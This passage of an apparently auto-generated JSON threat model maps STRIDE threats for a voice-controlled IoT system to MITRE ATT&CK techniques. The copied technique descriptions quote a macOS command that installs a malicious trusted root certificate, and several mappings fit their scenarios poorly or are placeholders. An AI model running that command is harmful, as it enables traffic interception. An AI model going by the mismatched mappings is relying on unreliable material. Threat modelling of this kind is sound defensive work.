                "Physical Access",
                "Firmware Modification",
                "Direct Kernel Manipulation",
                "Hardware Tampering"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny issuing voice commands, claiming their accounts were compromised.",
            "Assumptions": [
                {
                    "Assumption": "Lack of logging and transaction history for voice commands.",
                    "Role": "System Administrator",
                    "Condition": "System does not maintain detailed logs for audit."
                },
                {
                    "Assumption": "Weak user authentication mechanisms.",
                    "Role": "System Designer",
                    "Condition": "Authentication can be easily bypassed or spoofed."
                }
            ],
            "Potential Impact": "Disputes over the authenticity of issued commands and loss of trust in the system.",
            "MITRE ATT&CK Keywords": [
                "Repudiation of Actions",
                "Identity Fraud",
                "Audit Evasion",
                "Accountability Evasion"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Attacker manipulates log files or transactions to cover unauthorized actions within the system.",
            "Assumptions": [
                {
                    "Assumption": "Logs and transactions are stored without integrity protection.",
                    "Role": "System Administrator",
                    "Condition": "No cryptographic protections applied to logs."
                },
                {
                    "Assumption": "Attacker has access to write operations on logs.",
                    "Role": "Attacker",
                    "Condition": "Compromised account with write privileges."
                }
            ],
            "Potential Impact": "Tampered logs prevent the accurate tracing of unauthorized actions, hindering forensic analysis.",
            "MITRE ATT&CK Keywords": [
                "Log Manipulation",
                "Data Integrity Violation",
                "Forensic Evasion",
                "Audit Evasion"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A malicious user triggers actions using a shared or public account, and later denies responsibility.",
            "Assumptions": [
                {
                    "Assumption": "The system allows shared or public accounts.",
                    "Role": "System Designer",
                    "Condition": "Account policies are lax allowing shared usage."
                },
                {
                    "Assumption": "No individual-level accountability measures.",
                    "Role": "System Administrator",
                    "Condition": "Logs do not record individual user activities."
                }
            ],
            "Potential Impact": "Difficult to trace the misuse back to the specific individual, leading to operational and security concerns.",
            "MITRE ATT&CK Keywords": [
                "Shared Account Misuse",
                "Identity Masking",
                "Accountability Gaps",
                "Access Misuse"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to voice command logs allows attackers to extract sensitive user information.",
            "Assumptions": [
                {
                    "Assumption": "Voice command logs contain sensitive data.",
                    "Role": "System Designer",
                    "Condition": "Logs store user interactions including sensitive details."
                },
                {
                    "Assumption": "Logs are accessible without strict access controls.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient access governance on logs."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of personal or sensitive information leading to privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "Sensitive Data Exposure",
                "Log Data Leak",
                "Unauthorized Access",
                "Privacy Breach"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Cloud services storing user interactions are compromised, revealing sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Sensitive data is stored in the cloud.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Data not encrypted or poorly managed."
                },
                {
                    "Assumption": "Compromise due to vulnerabilities or attacks on cloud infrastructure.",
                    "Role": "Attacker",
                    "Condition": "Exploited security flaws in cloud services."
                }
            ],
            "Potential Impact": "Leakage of sensitive interactions compromising user privacy and security.",
            "MITRE ATT&CK Keywords": [
                "Cloud Data Breach",
                "Sensitive Information Leak",
                "Cloud Service Compromise",
                "Data Exposure"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Network surveillance intercepts unencrypted communication between client-side and server-side applications.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted.",
                    "Role": "System Designer",
                    "Condition": "Plaintext communication channels."
                },
                {
                    "Assumption": "Attacker has access to network traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to network infrastructure or wireless channels."
                }
            ],
            "Potential Impact": "Sensitive commands and responses intercepted, leading to potential misuse or eavesdropping.",
            "MITRE ATT&CK Keywords": [
                "Network Eavesdropping",
                "Data Interception",
                "Unencrypted Traffic",
                "Man-in-the-Middle"
            ],
            "mitre_technique": {
                "name": "Install Root Certificate",
                "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
                "id": "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1",
                "technique_id": "T1130"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attacker floods the server with requests, preventing legitimate processing of voice commands.",
            "Assumptions": [
                {
                    "Assumption": "Server lacks rate limiting or overload protection.",
                    "Role": "System Designer",
                    "Condition": "No throttling mechanisms in place."
                },
                {
                    "Assumption": "Attacker can generate high traffic volume.",
                    "Role": "Attacker",
                    "Condition": "Access to botnet or high-capacity systems."
                }
            ],
            "Potential Impact": "System becomes unresponsive, disrupting service availability.",
            "MITRE ATT&CK Keywords": [
                "DDoS Attack",
                "Server Overload",
                "Service Disruption",
                "Traffic Flooding"
            ],
            "mitre_technique": {
                "name": "Endpoint Denial of Service",
                "description": "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\n",
                "id": "attack-pattern--c675646d-e204-4aa8-978d-e3d6d65885c4",
                "technique_id": "T1499"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A vulnerability in the IoT controller firmware allows an attacker to crash the device.",
            "Assumptions": [
                {
                    "Assumption": "The vulnerability exists within the firmware.",
                    "Role": "IoT Device Maker",
                    "Condition": "Security flaws in device firmware."
                },
                {
                    "Assumption": "Attacker can exploit the vulnerability.",
                    "Role": "Attacker",
                    "Condition": "Technical capability to exploit flaws."
                }
            ],
            "Potential Impact": "Physical device becomes non-operational impacting IoT service availability.",
            "MITRE ATT&CK Keywords": [
                "Firmware Vulnerability",
                "Device Crash",
                "IoT Device Outage",
                "Exploitation"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker disrupts communication channels by jamming the signal used for IoT device control.",
            "Assumptions": [
                {
                    "Assumption": "IoT devices use wireless communication.",
                    "Role": "System Designer",
                    "Condition": "Wireless communication for device interaction."
                },
                {
                    "Assumption": "Attacker has access to jamming equipment.",
                    "Role": "Attacker",
                    "Condition": "Capability to transmit disruptive signals."
                }
            ],
            "Potential Impact": "Interruption in device communication, leading to service outages and unavailability.",
            "MITRE ATT&CK Keywords": [
                "Signal Jamming",
                "Wireless Interference",
                "Communication Disruption",
                "Jamming Attack"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Attacker exploits a vulnerability in the server application to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "Server vulnerability allows privilege escalation.",
                    "Role": "System Administrator",
                    "Condition": "Unpatched or misconfigured server system."
                },
                {
                    "Assumption": "Attacker has initial access to the system.",
                    "Role": "Attacker",
                    "Condition": "Initial foothold obtained through other means."
                }
            ],
            "Potential Impact": "Complete system compromise and unauthorized control over all components.",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Server Exploit",
                "Administrative Access Gain",
                "System Compromise"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages insecure APIs on the IoT controller to gain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "APIs are insecure with poor access control.",
                    "Role": "System Designer",
                    "Condition": "APIs lack robust security measures."
                },
                {
                    "Assumption": "Attacker can interact with APIs.",
                    "Role": "Attacker",
                    "Condition": "Access to the API endpoints."
                }
            ],
            "Potential Impact": "Unauthorized control over IoT devices and potential changes to system settings.",
            "MITRE ATT&CK Keywords": [
                "API Abuse",
                "Privilege Escalation",
                "IoT Device Control",
                "API Vulnerability Exploitation"
            ],
            "mitre_technique": {
                "name": "DLL Search Order Hijacking",
                "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program. (Citation: Microsoft Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.\n\nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory 2269637)\n\nPhantom DLL hijacking is a specific type of DLL search order hijacking where adversaries target references to non-existent DLL files.(Citation: Adversaries Hijack DLLs) They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.\n\nAdversaries may also directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order Hijacking)\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program. Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.",
                "id": "attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34",
                "technique_id": "T1574.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious code execution on client-side application provides elevated control to the attacker.",
            "Assumptions": [
                {
                    "Assumption": "Client-side application has exploitable vulnerabilities.",
                    "Role": "Application Developer",
                    "Condition": "Unpatched or insecure application code."
                },
                {
                    "Assumption": "User runs maliciously crafted input.",
                    "Role": "User",
                    "Condition": "User interacts with untrusted sources or inputs."
                }
            ],
            "Potential Impact": "Gain of unauthorized privileges on the client-side, leading to further system exploitation.",
            "MITRE ATT&CK Keywords": [
                "Client-side Exploit",
                "Malware Execution",
                "Privilege Increase",
                "System Exploitation"
            ],
            "mitre_technique": {
                "name": "Exploits",
                "description": "Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.(Citation: NYTStuxnet) Adversaries may use information acquired via [Vulnerabilities](https://attack.mitre.org/techniques/T1588/006) to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.(Citation: Irongeek Sims BSides 2017)\n\nAs with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",
                "id": "attack-pattern--bbc3cba7-84ae-410d-b18b-16750731dfa2",
                "technique_id": "T1587.004"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "23",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a user's voice command to gain unauthorized access to IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to samples of the user's voice.",
                    "Role": "Attacker",
                    "Condition": "Attacker records or synthesizes the user's voice."
                },
                {
                    "Assumption": "The voice authentication mechanism does not effectively differentiate between genuine and spoofed voices.",
                    "Role": "Security System",
                    "Condition": "The system relies heavily on voice patterns without additional verification steps."
                },
                {
                    "Assumption": "The attacker is within range of the microphone.",
                    "Role": "Attacker",
                    "Condition": "Physical proximity or remote access setup by attacker."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data, system control, and physical security breaches.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "voice command",
                "IoT devices",
                "identity theft"
            ],
            "mitre_technique": {
                "name": "GUI Input Capture",
                "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.",
                "id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d",
                "technique_id": "T1056.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses spoofed identities to access the server-side application and manipulate data.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can obtain or guess valid credentials.",
                    "Role": "Attacker",
                    "Condition": "Weak or reused passwords, social engineering."
                },
                {
                    "Assumption": "The server-side application does not have additional authentication measures in place.",
                    "Role": "Security System",
                    "Condition": "Lack of multi-factor authentication or robust intrusion detection systems."
                },
                {
                    "Assumption": "The attacker has network access to send credentials to server.",
                    "Role": "Attacker",
                    "Condition": "Access through compromised network or exploited vulnerabilities."
                }
            ],
            "Potential Impact": "Data corruption and unauthorized actions within the system.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "server access",
                "identity theft",
                "credential theft"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs the identity of the IoT controller to send false commands to IoT devices.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has intercepted communication between client and IoT controller.",
                    "Role": "Attacker",
                    "Condition": "Successful man-in-the-middle attack or network sniffing."
                },
                {
                    "Assumption": "The IoT controller lacks proper validation of incoming commands.",
                    "Role": "IoT Controller",
                    "Condition": "Absence of cryptographic validation or secure channels."
                },
                {
                    "Assumption": "The attacker has the technical means to emulate the IoT controller's command structure.",
                    "Role": "Attacker",
                    "Condition": "Knowledge of protocol and command language."
                }
            ],
            "Potential Impact": "Disruption of physical devices and unauthorized access to IoT functionalities.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "IoT controller",
                "command injection",
                "network penetration"
            ],
            "mitre_technique": {
                "name": "ARP Cache Poisoning",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
                "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
                "technique_id": "T1557.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker tampers with the audio signals being transmitted between the microphone and the client-side application.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can access the communication channel between the microphone and client.",
                    "Role": "Attacker",
                    "Condition": "Proximity to the microphone or compromised network security."
                },
                {
                    "Assumption": "The communication channel is not encrypted.",
                    "Role": "Communication Channel",
                    "Condition": "Lack of or weak encryption mechanisms in the application."
                },
                {
                    "Assumption": "The client-side application does not verify the integrity of received audio signals.",
                    "Role": "Client-side Application",
                    "Condition": "Absence of checksums or cryptographic verification."
                }
            ],
            "Potential Impact": "Data corruption leading to misinterpretation of user commands.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "audio signals",
                "signal interception",
                "data corruption"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to the server-side application and alters stored data or configurations.",
            "Assumptions": [
                {
                    "Assumption": "The attacker finds a vulnerability in the server-side application.",
                    "Role": "Attacker",
                    "Condition": "Exploit known or zero-day vulnerabilities."
                },
                {
                    "Assumption": "The server lacks rigorous access control and monitoring.",
                    "Role": "Server",
                    "Condition": "Inadequate logging, monitoring, and access control mechanisms."
                },
                {
                    "Assumption": "The attacker has sufficient privileges to modify data.",
                    "Role": "Attacker",
                    "Condition": "Privileges escalated via vulnerabilities or compromised accounts."
                }
            ],
            "Potential Impact": "Integrity issues, potential denial of service, and unauthorized actions being executed.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "server application",
                "configuration alteration",
                "data manipulation"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
